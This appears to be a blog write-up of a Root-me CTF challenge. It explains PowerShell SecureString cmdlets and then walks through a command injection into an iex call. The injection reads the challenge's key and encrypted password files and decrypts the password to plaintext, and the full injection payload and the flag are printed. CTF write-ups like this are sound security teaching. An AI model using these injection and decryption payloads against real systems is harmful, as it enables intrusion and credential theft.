---
title: Powershell - SecureString - root-me.org
published: true
---

# [](#intro)Introduction

Let's do the level 2 of the Powershell - Command Injection CTF. You can check it out the level 1 write up [here](/powershell-command-injection-root-me). This CTF can be found under the App Script tab on [Root-me](https://www.root-me.org).

# [](#level-description)Challenge description
Let's check the statement:

> Statement
>
> Recover the database’s password, with a twist!

We have basically the same problem as the level 1, but with a probable more secure password to hack. To ssh into the machine, we need to run:

`ssh -p 2225 app-script-ch19@challenge05.root-me.org`

and provide the password: `app-script-ch19`.

# [](#approach)Approach mindset

Let's keep our approach mindset. For those who may not be closely following every release of our write-ups, this mindset is founded on four steps:

1. Understanding basic concepts
2. Understanding the problem
3. Crafting an attack
4. Solving

These steps are interconnected, and when followed methodically, they make the subsequent steps more straightforward.

## [](#mindset-step1)Step 1 - Understanding basic concepts

We have already covered the powershell basics [here](/powershell-command-injection-root-me#step-1---understanding-basic-concepts). However, what is the 'PowerShell SecureString'? This was my first question, since I'm not at all fluent in this script language.

As described by Microsoft: 

> _The `ConvertTo-SecureString` cmdlet converts plain text to secure strings. [...] The secure string can be converted back to an encrypted, standard string using the `ConvertFrom-SecureString` cmdlet. This enables it to be stored in a file for later use._

One example of how we can use this is by creating a variable that reads user input and convert it to a secure string. Let's see how this works by opening our Linux powershell:

```bash
PS /home/kaizen> $secure = Read-Host -AsSecureString
******
PS /home/kaizen> echo $secure                        
System.Security.SecureString
```

As we can see, the input has been converted to a secure string and we are not able to read it. We can encrypt our secure string by using the `ConvertFrom-SecureString` cmdlet:

```bash
PS /home/kaizen> $encrypted = ConvertFrom-SecureString -SecureString $secure
PS /home/kaizen> echo $encrypted                                            
6800690020006d006f006d00
```

Finally, to recover the secure string, we can use `ConvertTo-SecureString` cmdlet onto the `$encrypted` variable we created:

```bash
PS /home/kaizen> $secure2 = ConvertTo-SecureString -String $encrypted       
PS /home/kaizen> $secure2
System.Security.SecureString
```

We could also create a secure string from an encrypted file:

```bash
PS /home/kaizen> $encrypted = ConvertFrom-SecureString -SecureString $secure -Key (1..16)
PS /home/kaizen> $encrypted | Set-Content encrypted.txt                                  
PS /home/kaizen> $secure2 = Get-Content ./encrypted.txt | ConvertTo-SecureString -Key (1..16)
PS /home/kaizen> $secure2
System.Security.SecureString
```

This is just the basics. If you are interesting in learning more aboute secure strings, go check it out at the [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring?view=powershell-7.4) official documentation.


## [](#mindset-step1) Step 2 - Understanding the problem

Let's ssh into the machine and check it out. As soon as we are in, we are greeted with a CLI program, same as the level 1:

```bash
> ls
Connect to the database With the secure Password: System.Security.SecureString. Backup th
e table ls
Table to dump:
```

Well, since we have already solved level 1, let's use our approach to gather information. Let's run our command injection `; ls`:

```bash
> ; ls
Connect to the database With the secure Password: System.Security.SecureString. Backup th
e table


    Directory: C:\cygwin64\challenge\app-script\ch19


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       12/12/2021   9:25 AM             43 .git
-a----       10/29/2020   9:27 AM            361 .passwd.crypt
------       12/12/2021   9:50 AM            748 ._perms
-a----       10/29/2020   9:23 AM            176 AES.key
-a----       10/29/2020   9:30 AM            331 ch19.ps1
```

Nice! We have access to all of these files. But it seems our `.passwd` is encrypted. Let's use `; cat .passwd.crypt` to see:

```bash
> ; cat .passwd.crypt
Connect to the database With the secure Password: System.Security.SecureString. Backup th
e table
76492d1116743f0423413b16050a5345MgB8AEkAMQBwAEwAbgBoAHgARwBXAHkAMgB3AGcAdwB3AHQARQBqAEEAR
QBPAEEAPQA9AHwAMgAyAGMANQA1ADIANwBiADEANQA4ADIANwAwAGIANAA2ADIAMQBlADAANwA3ADIAYgBkADYANg
AyADUAYwAyAGMAYQBhAGUAMAA5ADUAMAA2ADUAYQBjADIAMQAzADIAMgA1AGYANgBkAGYAYgAxAGMAMgAwADUANQB
kADIAMgA0AGQAYgBmADYAMQA4AGQAZgBkAGQAMwAwADUANAA4AGYAMAAyADgAZAAwADEAMgBmAGEAZQBmADgANAAy
ADkA
```

Yep. This is not the answer, or else this problem would've been the same as the first one. Let's take a look at the code `ch19.ps1` running the command `; cat ch19.ps1`:

```powershell
$KeyFile = "AES.key"
$key = Get-Content $KeyFile
$SecurePassword = Get-Content .passwd.crypt | ConvertTo-SecureString -key $Key

while($true){
        Write-Host "Table to dump:"
        Write-Host -NoNewLine "> "
        $table=Read-Host

        iex "Write-Host Connect to the database With the secure Password: $SecurePassword
. Backup the table $table"
}
```

Hm. Interesting. So we could access the `$SecurePassword` variable, which might be a secure string version of the `.passwd.crypt`. To do this, we simply run:

```bash
> ; echo $SecurePassword
Connect to the database With the secure Password: System.Security.SecureString. Backup th
e table
System.Security.SecureString
```

As we can see, we were right. This problem is using the techniques we found by Microsoft documentation to decrypt the password with the `ConvertTo-SecureString` cmdlet.

Since we are able to access the powershell shell, we just need to find the command sequence to transform the secure string in readable format. One way to do that is by creating a variable that converts a secure string into a binary string (BSTR). This [post](https://stackoverflow.com/questions/28352141/convert-a-secure-string-to-plain-text) talks about this.

As we can see, we need a series of commands to get what we want. Before attempting on the machine, let's try it out on my local PCs:

```bash
PS /home/kaizen> $secure
System.Security.SecureString
PS /home/kaizen> $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secure)        
PS /home/kaizen> $BSTR
140321549720616
PS /home/kaizen> $unsecure = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
PS /home/kaizen> $unsecure
hacked
```

But how could we get the plain text version of our `.passwd`? Well, that is where we get to our step 3.

## [](#mindset-step3)Step 3 - Crafting the attack

Now that we understand the basic concepts and the CTF problem, the solution becomes clearer. Take a sip of your coffee, sit back and enjoy our findings!

1. We could detect a command injection vulnerability in this powershell CLI, where when user passes the `;` pipe, we can execute arbitrary code.

2. We know how to convert secure string into plain text.

Uniting both, we can build the perfect attack! How about something like:

```bash
; $key2 = Get-Content $KeyFile; $SecurePassword = Get-Content .passwd.crypt |
ConvertTo-SecureString -key $key2; $BSTR = [System.Runtime.InteropServices.Marsh
al]::SecureStringToBSTR($SecurePassword); $PlainPassword = [System.Runtime.Inter
opServices.Marshal]::PtrToStringAuto($BSTR); echo $PlainPassword
```

Let's understand this injection: first, we create a variable called `$key2` which will read the contents of the `$KeyFile` variable. After that, we proceed to decrypt the `.passwd.crypt` into a secure string using the `ConvertTo-SecureString` cmdlet, storing the result into `$SecurePassword` variable. After that, we simply apply our conversion from secure string to binary string, then to plain text, as we did in Step 2.

If everything runs smoothly, we shall solve this problem.


## [](#mindset-step4) Step 4 - Solving!

Let's try our attack payload to see what happens:

```bash
Table to dump:
> ; $key2 = Get-Content $KeyFile; $SecurePassword = Get-Content .passwd.crypt | ConvertTo
-SecureString -key $key2; $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringT
oBSTR($SecurePassword); $PlainPassword = [System.Runtime.InteropServices.Marshal]::PtrToS
tringAuto($BSTR); echo $PlainPassword
Connect to the database With the secure Password: System.Security.SecureString. Backup th
e table
SecureStringBypass
```

And there we have it! Our flag!

# [](#conclusions) Conclusion

In this CTF, we understood how secure strings work in powershell. We learned how to create secure strings and how to convert them back to a binary string. We also learned how to encrypt & decrypt secure strings using `ConvertTo-SecureString` and `ConvertFrom-SecureString` cmdlets.

We were able to solve this challenge because we found a command injection (thanks to our level 1 solution), followed by the conversion from secure string to binary string. 

I hope you liked this write-up and learned something now. As always, don't forget to do your **research!**



<a href="/">Go back</a>



